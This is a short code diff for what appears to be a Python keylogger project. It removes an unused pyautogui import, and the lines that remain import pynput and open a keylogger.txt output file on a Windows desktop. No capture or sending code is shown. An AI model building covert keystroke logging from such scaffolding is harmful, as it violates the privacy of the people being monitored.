@@ -1,4 +1,3 @@
-import pyautogui as pagui
 import pynput
 
 keylogger_txt = open(r"C:\Users\msher\Desktop\Desktop\CyberFowl\keylogger.txt", "w")
